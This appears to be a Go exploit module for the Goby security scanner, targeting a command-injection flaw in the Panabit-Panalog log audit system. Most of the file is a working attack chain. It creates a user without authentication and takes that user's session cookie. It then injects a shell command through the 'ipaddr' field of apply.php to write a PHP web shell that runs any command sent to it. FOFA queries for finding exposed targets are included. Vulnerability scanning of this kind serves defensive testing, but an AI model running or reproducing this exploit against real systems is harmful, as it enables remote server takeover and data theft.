package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Panabit-Panalog log system apply.php command execution",
    "Description": "<p>The Panabit log audit system of Beijing Paiwang Company can collect all log data from users, including session data, event data and identity data, and process the data effectively, including ranking, distribution, trend and similarity. With the help of a good distributed design concept, the data storage and processing capacity can be linearly expanded in the cluster mode, and the raw data file interface can be provided for Hadoop and other big data processing platforms to demonstrate full openness. Built in analysis tools represented by traffic flow direction, traffic profile, user profile, 7-tier application event back check, access sequencing, virtual identity information, mobile terminal identification, user behavior, geographic location, end-user heat map, IP trajectory, TOP domain name, application flow direction map, URL map, TOP users, connection visual analysis and DNS visual analysis provide users with comprehensive records, understanding Ability to analyze and master network details and trends. The latest version of Panabit log audit system of Beijing Dispatch Network Company: 202,209,272,002 has a command execution vulnerability, which can be used by attackers to gain server control permissions.</p>",
    "Product": "Panabit-Panalog",
    "Homepage": "https://www.panabit.com/cn/product/productX/2017/0522/151.html",
    "DisclosureDate": "2022-11-17",
    "Author": "1243099890@qq.com",
    "FofaQuery": "(body=\"id=\\\"codeno\\\"\" && body=\"日志系统\") || title=\"panalog\"",
    "GobyQuery": "(body=\"id=\\\"codeno\\\"\" && body=\"日志系统\") || title=\"panalog\"",
    "Level": "3",
    "Impact": "<p>The latest version of Panabit log audit system of Beijing Dispatch Network Company: 202209272002 has a command execution vulnerability, which can be used by attackers to gain server control permissions.</p>",
    "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.panabit.com/\">https://www.panabit.com/</a></p><p>2.Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/singleuser_action.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"syncInfo\":{\"operationType\":\"ADD_USER\",\"user\":{\"userId\":111}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"yn\":\"yes\",\"str\":\"OK\"}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/singlelogin.php?userId=111",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "setcookie|lastheader|regex|Set-Cookie: PHPSESSID=(.*?); "
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/content-apply/apply.php",
                "follow_redirect": false,
                "header": {
                    "Cookie": "{{{setcookie}}}",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "type=app_apply&ipaddr=;echo '<?php echo md5(233);unlink(__FILE__);?>'>{{{setcookie}}}.php;"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/content-apply/{{{setcookie}}}.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/singleuser_action.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"syncInfo\":{\"operationType\":\"ADD_USER\",\"user\":{\"userId\":111}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"yn\":\"yes\",\"str\":\"OK\"}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/singlelogin.php?userId=111",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "setcookie|lastheader|regex|Set-Cookie: PHPSESSID=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/content-apply/apply.php",
                "follow_redirect": false,
                "header": {
                    "Cookie": "{{{setcookie}}}",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "type=app_apply&ipaddr=;echo '<?php system($_POST['cmd']);unlink(__FILE__);?>'>{{{setcookie}}}.php;"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/content-apply/{{{setcookie}}}.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "cmd={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Panabit-Panalog日志系统 apply.php 命令执行",
            "Product": "Panabit-Panalog",
            "Description": "<p>北京派网公司 Panabit日志审计系统可以收集来自用户的所有日志数据，包括Session数据、事件数据和身份数据，并对数据进行有效的加工处理，处理方式包括排名、分布、趋势和相似性。借助良好的分布式设计理念，可以以集群方式线性扩大数据存储和处理能力，并为Hadoop等大数据处理平台提供raw data文件接口，展示充分的开放性。以流量流向、流量概况、用户画像、7层应用事件反查、访问排序、虚拟身份信息、移动终端识别、用户行为、地理位置、终端用户热力图、IP轨迹、TOP域名、应用流量流向图、URL地图、TOP用户、连接可视化分析和DNS可视化分析等为代表的内置分析工具，为用户提供了全面记录、了解、分析和掌握网络细节和趋势的能力。北京派网公司 Panabit日志审计系统最新版：202209272002 存在命令执行漏洞，攻击者可以使用该漏洞拿到服务器控制权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.panabit.com/\">https://www.panabit.com/</a><a href=\"https://www.weaver.com.cn/\"></a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>北京派网公司 Panabit日志审计系统最新版：202209272002 存在命令执行漏洞，攻击者可以使用该漏洞拿到服务器控制权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Panabit-Panalog log system apply.php command execution",
            "Product": "Panabit-Panalog",
            "Description": "<p>The Panabit log audit system of Beijing Paiwang Company can collect all log data from users, including session data, event data and identity data, and process the data effectively, including ranking, distribution, trend and similarity. With the help of a good distributed design concept, the data storage and processing capacity can be linearly expanded in the cluster mode, and the raw data file interface can be provided for Hadoop and other big data processing platforms to demonstrate full openness. Built in analysis tools represented by traffic flow direction, traffic profile, user profile, 7-tier application event back check, access sequencing, virtual identity information, mobile terminal identification, user behavior, geographic location, end-user heat map, IP trajectory, TOP domain name, application flow direction map, URL map, TOP users, connection visual analysis and DNS visual analysis provide users with comprehensive records, understanding Ability to analyze and master network details and trends. The latest version of Panabit log audit system of Beijing Dispatch Network Company: 202,209,272,002 has a command execution vulnerability, which can be used by attackers to gain server control permissions.<br></p>",
            "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.panabit.com/\">https://www.panabit.com/</a><br></p><p>2.Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.<br></p>",
            "Impact": "<p>The latest version of Panabit log audit system of Beijing Dispatch Network Company: 202209272002 has a command execution vulnerability, which can be used by attackers to gain server control permissions.</span><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}